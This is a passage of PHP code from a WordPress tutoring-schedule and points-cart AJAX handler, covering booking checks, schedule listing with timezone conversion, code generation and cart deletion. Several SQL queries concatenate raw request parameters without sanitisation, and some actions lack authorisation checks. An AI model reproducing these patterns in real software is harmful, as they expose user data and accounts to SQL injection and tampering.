    $time = $_REQUEST['time'];
    $user_id = get_current_user_id();

    $user_points = get_user_meta($user_id, 'user_points', true);
    $user_points = empty($user_points) ? 0 : $user_points;
    /*
    $pst = mw_get_option('price_schedule_tutoring');

    $query = 'SELECT tp.*, u.display_name AS student_name
        FROM ' . $wpdb->prefix . 'dict_tutoring_plan AS tp
        LEFT JOIN ' . $wpdb->users . ' AS u ON u.ID = tp.id_user
        WHERE tp.id_user = '.$user_id.' AND canceled = 0 AND tp.tutor_id = '.$tutor_id;
    $result = $wpdb->get_row($query);
    $arr = array();
    if($result){
        $total = (int)$result->total_time*$pst/100;
        $arr['id'] = $result->id;
        $arr['total_time'] = $result->total_time;
        $arr['total'] = $total;
        $arr['user_points'] = $user_points;
    }*/
    $query = 'SELECT id
        FROM ' . $wpdb->prefix . 'dict_tutoring_plan
        WHERE id_user = '.$user_id.' AND tutor_id = '.$tutor_id.' AND date = \''.$day.'\' AND time = \''.$time.'\' AND status = 2';
    $row = $wpdb->get_row($query);
    if($row){
        $arr['exit'] = 1;
        $arr['user_points'] = $user_points;
        echo json_encode($arr);
    }else{
        $arr['exit'] = 0;
        $arr['user_points'] = $user_points;
        echo json_encode($arr);
    }
    exit;
}
if ($task == "accept_schedule_now") {
    $id = $_REQUEST['id'];
    $total = $_REQUEST['total'];

    $user_id = get_current_user_id();

    $user_points = get_user_meta($user_id, 'user_points', true);
    $user_points = empty($user_points) ? 0 : $user_points;

    if((int)$total > $user_points){
        echo 0;
        exit;
    }
    /*else{
        $upoints = $user_points - (int)$total;
        update_user_meta($current_user_id, 'user_points', $upoints);
        $result = $wpdb->update(
                $wpdb->prefix . 'dict_tutoring_plan', array(
                    'confirmed' => 1,
                    'canceled' => 0,
                    'status'   => 1
                ), array('id' => $id)
            );
    }*/
    echo 1;
    exit;
}
if ($task == "canceled_schedule_now") {
    $id = $_REQUEST['id'];
    $status = $_REQUEST['status'];

    $query = 'SELECT id
        FROM ' . $wpdb->prefix . 'dict_tutoring_plan
        WHERE id = '.$id.' AND accepted = 1';
    $row = $wpdb->get_row($query);
    if($row){
        echo 0;
        exit;
    }else{
        $result = $wpdb->update(
                $wpdb->prefix . 'dict_tutoring_plan', array(
                    'status' => $status
                ), array('id' => $id)
            );

        echo 1;
        exit;
    }
}
if ($task == "get_my_schedules"){
    $arr = MWDB::get_my_schedules();
    echo json_encode($arr);
    exit;
}
if ($task == "create_code") {
    $id = $_REQUEST['userid'];
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    $size = strlen( $chars );
    for( $i = 0; $i < 15; $i++ ) {
        $str .= $chars[ rand( 0, $size - 1 ) ];
    }
    $code = get_user_meta($id,'code_point',true);
    if($code == ''){
        $code = [];
        $code[] = $str;
    }else{
        $code[] = $str;
    }
    update_user_meta($id,'code_point',$code);
    echo $str;
    


}

if($task == "process_point_payment") {
    ik_process_point_payment();
}
if($task == 'get_scheduled_day_tutor'){
    $day = $_REQUEST["day"];
    $user_id = $_REQUEST["userid"];
    if($day == '')
        $date = date('Y-m-d',time());
    else
        $date = $day;
    
    
    $price_tutoring = get_user_meta($user_id, 'price_tutoring', true);
    $user_points = get_user_meta($user_id, 'user_points', true);
    $user_points = empty($user_points) ? 0 : $user_points;
    $time_zone = get_user_meta($user_id, 'user_timezone', true);
    $time_zone = empty($time_zone) ? 0 : $time_zone;    
    $u_time_zone_index = get_user_meta($user_id, 'time_zone_index', true);
    $u_time_zone_index = empty($u_time_zone_index)? 0 : $u_time_zone_index;
    $time_zone_name = get_user_meta($user_id, 'time_zone_name', true);
    $timezone_name = empty($time_zone_name)? convert_timezone_to_name($u_time_zone_index):$time_zone_name;
    $first_name = get_user_meta($user_id,'first_name',true);
    $last_name = get_user_meta($user_id,'last_name',true);
    $full_name = $first_name.' '.$last_name;
    $up_price_one = get_user_meta($user_id, 'price_array', true);
    $up_price_group = get_user_meta($user_id, 'group_price_array', true);
    
    
   

    $query2 = "SELECT tp.*, u.display_name AS student_name
            FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
            LEFT JOIN " . $wpdb->users . " AS u ON u.ID = tp.id_user
            WHERE tp.canceled = 0 AND tp.accepted = 1 AND tp.tutor_id = ".$user_id."
            ORDER BY tp.date DESC";
    $results_cf = $wpdb->get_results($query2);
    $confirmed = array();
    if(count($results_cf) > 0){
        foreach ($results_cf as $v) {
            $date_time2 = explode('~', $v->time);
            $start2 = substr(trim($date_time2[0]),0,-3).' '.strtoupper(substr(trim($date_time2[0]),-2));
            $end2 = substr(trim($date_time2[1]),0,-3).' '.strtoupper(substr(trim($date_time2[1]),-2));
            $timezone_scheduled2 = convert_timezone_to_name($v->time_zone_index);
            
            $original_datetime_st2 = $v->date.' '.$start2;
            $original_timezone_st2 = new DateTimeZone($timezone_scheduled2);
            $datetime_st2 = new DateTime($original_datetime_st2, $original_timezone_st2);
            $target_timezone_st2 = new DateTimeZone($timezone_name);
            $datetime_st2->setTimeZone($target_timezone_st2);
            
            $original_datetime_ed2 = $v->date.' '.$end2;
            $original_timezone_ed2 = new DateTimeZone($timezone_scheduled2);
            $datetime_ed2 = new DateTime($original_datetime_ed2, $original_timezone_ed2);
            $target_timezone_ed2 = new DateTimeZone($timezone_name);
            $datetime_ed2->setTimeZone($target_timezone_ed2);

            $time = $datetime_st2->format('h:i A').' - '.$datetime_ed2->format('h:i A');
            $keyprice = $date.$time;
            $price_one = $up_price_one[$keyprice];
            $price_group = $up_price_group[$keyprice];
            $confirmed[] = array(
                            'subject' => $v->subject,
                            'private_subject' => $v->private_subject,
                            'short_message' => $v->short_message,                        
                            'student_name' => $v->student_name,
                            'date' => $datetime_st2->format('F d, Y'),
                            'date_view' => $datetime_st2->format('m/d/Y'),
                            'stuff' => $datetime_st2->format('(D)'),
                            'time_view' => $time,
                            'time' => $v->time,
                            'time_start' => $datetime_st2->format('h:i a'),
                            'time_end' => $datetime_ed2->format('h:i a'),
                            'stime' => strtotime($datetime_st2->format('Y-m-d H:i:s')),
                        );
        }
    }
    if(count($confirmed) > 0){
        array_multisort(
            array_column($confirmed, 'stime'), SORT_NUMERIC, SORT_DESC,
            $confirmed
        );
    }

    $query3 = "SELECT ta.*, u.display_name AS student_name
            FROM " . $wpdb->prefix . "dict_tutoring_available AS ta
            LEFT JOIN " . $wpdb->users . " AS u ON u.ID = ta.tutor_id
            WHERE ta.tutor_id = ".$user_id." 
            ORDER BY ta.date DESC"; //tp.date = '".$date."' AND 
    $results3 = $wpdb->get_results($query3);
    $availables = array();
    if(count($results3) > 0){
        foreach ($results3 as $item) {
            $date_time3 = explode('~', $item->time);
            $start3 = substr(trim($date_time3[0]),0,-3).' '.strtoupper(substr(trim($date_time3[0]),-2));
            $end3 = substr(trim($date_time3[1]),0,-3).' '.strtoupper(substr(trim($date_time3[1]),-2));
            $timezone_scheduled3 = convert_timezone_to_name($item->time_zone_index);
            
            $original_datetime_st3 = $item->date.' '.$start3;
            $original_timezone_st3 = new DateTimeZone($timezone_scheduled3);
            $datetime_st3 = new DateTime($original_datetime_st3, $original_timezone_st3);
            $target_timezone_st3 = new DateTimeZone($timezone_name);
            $datetime_st3->setTimeZone($target_timezone_st3);
        
            $original_datetime_ed3 = $item->date.' '.$end3;
            $original_timezone_ed3 = new DateTimeZone($timezone_scheduled3);
            $datetime_ed3 = new DateTime($original_datetime_ed3, $original_timezone_ed3);
            $target_timezone_ed3 = new DateTimeZone($timezone_name);
            $datetime_ed3->setTimeZone($target_timezone_ed3);
            
            $original_datetime_ct3 = $item->created_on;
            $original_timezone_ct3 = new DateTimeZone($timezone_scheduled3);
            $datetime_ct3 = new DateTime($original_datetime_ct3, $original_timezone_ct3);
            $target_timezone_ct3 = new DateTimeZone($timezone_name);
            $datetime_ct3->setTimeZone($target_timezone_ct3);

            if($datetime_st3->format('Y-m-d') == $date){
                
                if($datetime_st3->format('G') == '0')
                    $start_id3 = '12_'.$datetime_st3->format('i_a');
                else
                    $start_id3 = $datetime_st3->format('G_i_a');
                    
                if($datetime_ed3->format('G') == '0')
                    $end_id3 = '12_'.$datetime_ed3->format('i_a');
                else
                    $end_id3 = $datetime_ed3->format('G_i_a');
                
                $query_count = "SELECT tp.*
                        FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
                        WHERE tp.tutor_id = ".$user_id." AND tp.date = '".$date."' AND tp.time = '".$item->time."' AND tp.status = 2";
                $results_count = $wpdb->get_results($query_count);

                $query_accept = "SELECT tp.*
                        FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
                        WHERE tp.tutor_id = ".$user_id." AND tp.date = '".$date."' AND tp.time = '".$item->time."' AND tp.status = 2 AND tp.accepted = 1";
                $results_accept = $wpdb->get_results($query_accept);

                if(count($results_accept) == 1)
                    $ct_users = 1;
                else
                    $ct_users = count($results_count);
                $keyprice = $date.$item->time_start;
                $price_one = $up_price_one[$keyprice];
                $price_group = $up_price_group[$keyprice];
                $availables[] = array(
                    'id' => $item->id,
                    'tutor_id' => $item->tutor_id,
                    'start_id' => $start_id3,
                    'end_id' => $end_id3,
                    'one_tutoring'=>$item->enable_one_tutoring,
                    'group_tutoring' => $item->enable_group_tutoring,
                    'subject_name'=>$item->subject_name,
                    'subject_type'=>$item->subject_type,
                    'fromtime' => $item->time_start,
                    'totime' => $item->time_end,
                    'price_tutoring' => $item->price_tutoring,
                    'price_group_tutoring' => $item->price_group_tutoring,
                    'up_price_tutoring' => $up_price_one[$keyprice],
                    'up_price_group_tutoring' => $up_price_group[$keyprice],
                    'time' => $item->time,
                    'day' => $item->date,
                    'stime' => strtotime($datetime_st3->format('Y-m-d H:i:s')),
                    'users' => $ct_users,
                    'accept' => count($results_accept),
                    'fullname' => $full_name
                );
            }            
        }
    }

    if(count($availables) == 0){
        $query4 = "SELECT tp.*, u.display_name AS student_name
            FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
            LEFT JOIN " . $wpdb->users . " AS u ON u.ID = tp.id_user
            WHERE tp.tutor_id = ".$user_id." 
            ORDER BY tp.date DESC"; //tp.date = '".$date."' AND 
        $results4 = $wpdb->get_results($query4);
        if(count($results4) > 0){
            foreach ($results4 as $item) {
                $date_time3 = explode('~', $item->time);
                $start3 = substr(trim($date_time3[0]),0,-3).' '.strtoupper(substr(trim($date_time3[0]),-2));
                $end3 = substr(trim($date_time3[1]),0,-3).' '.strtoupper(substr(trim($date_time3[1]),-2));
                $timezone_scheduled3 = convert_timezone_to_name($item->time_zone_index);
                
                $original_datetime_st3 = $item->date.' '.$start3;
                $original_timezone_st3 = new DateTimeZone($timezone_scheduled3);
                $datetime_st3 = new DateTime($original_datetime_st3, $original_timezone_st3);
                $target_timezone_st3 = new DateTimeZone($timezone_name);
                $datetime_st3->setTimeZone($target_timezone_st3);
            
                $original_datetime_ed3 = $item->date.' '.$end3;
                $original_timezone_ed3 = new DateTimeZone($timezone_scheduled3);
                $datetime_ed3 = new DateTime($original_datetime_ed3, $original_timezone_ed3);
                $target_timezone_ed3 = new DateTimeZone($timezone_name);
                $datetime_ed3->setTimeZone($target_timezone_ed3);
                
                $original_datetime_ct3 = $item->created_on;
                $original_timezone_ct3 = new DateTimeZone($timezone_scheduled3);
                $datetime_ct3 = new DateTime($original_datetime_ct3, $original_timezone_ct3);
                $target_timezone_ct3 = new DateTimeZone($timezone_name);
                $datetime_ct3->setTimeZone($target_timezone_ct3);

                if($datetime_st3->format('Y-m-d') == $date){
                    
                    if($datetime_st3->format('G') == '0')
                        $start_id3 = '12_'.$datetime_st3->format('i_a');
                    else
                        $start_id3 = $datetime_st3->format('G_i_a');
                        
                    if($datetime_ed3->format('G') == '0')
                        $end_id3 = '12_'.$datetime_ed3->format('i_a');
                    else
                        $end_id3 = $datetime_ed3->format('G_i_a');
                    
                    $query_count = "SELECT tp.*
                            FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
                            WHERE tp.tutor_id = ".$user_id." AND tp.date = '".$date."' AND tp.time = '".$item->time."' AND tp.status = 2";
                    $results_count = $wpdb->get_results($query_count);

                    $query_accept = "SELECT tp.*
                            FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
                            WHERE tp.tutor_id = ".$user_id." AND tp.date = '".$date."' AND tp.time = '".$item->time."' AND tp.status = 2 AND tp.accepted = 1";
                    $results_accept = $wpdb->get_results($query_accept);

                    if(count($results_accept) == 1)
                        $ct_users = 1;
                    else
                        $ct_users = count($results_count);
                    
                    $availables[] = array(
                        'id' => $item->id,
                        'tutor_id' => $item->tutor_id,
                        'start_id' => $start_id3,
                        'end_id' => $end_id3,
                        'fromtime' => isset($item->time_start)?$item->time_start:$datetime_st3->format('h:ia'),
                        'totime' => isset($item->time_end)?$item->time_end:$datetime_ed3->format('h:ia'),
                        'time' => $item->time,
                        'day' => $item->date,
                        'stime' => strtotime($datetime_st3->format('Y-m-d H:i:s')),
                        'users' => $ct_users,
                        'accept' => count($results_accept)
                    );
                }            
            }
        }
    }

    echo json_encode(array('confirmed' => $confirmed, 'availables' => $availables, 'points' => $user_points, 'price_tutoring' => $price_tutoring));//'scheduled' => $arr, 
    die;
}
if($task == "get_name_tutor") {
    $id = $_REQUEST['id'];
    echo get_user_meta($id,'first_name',true).' '.get_user_meta($id,'last_name',true);
}
if($task =="delete_item") {
    $data = $_REQUEST['data'];
    $current_user_id = get_current_user_id();
    $cart = get_user_cart();

    if (isset($data)) {
        foreach ($cart->items as $key => $item) {
            if ($item->id == $data) {
                $cart->total_amount -= $item->price;
                unset($cart->items[$key]);
            }
        }
    }

    $data = array(
        'items' => json_encode($cart->items),
        'total_amount' => $cart->total_amount
    );

    MWDB::update_user_shopping_cart($current_user_id, $data);
    echo get_cart_amount();
}

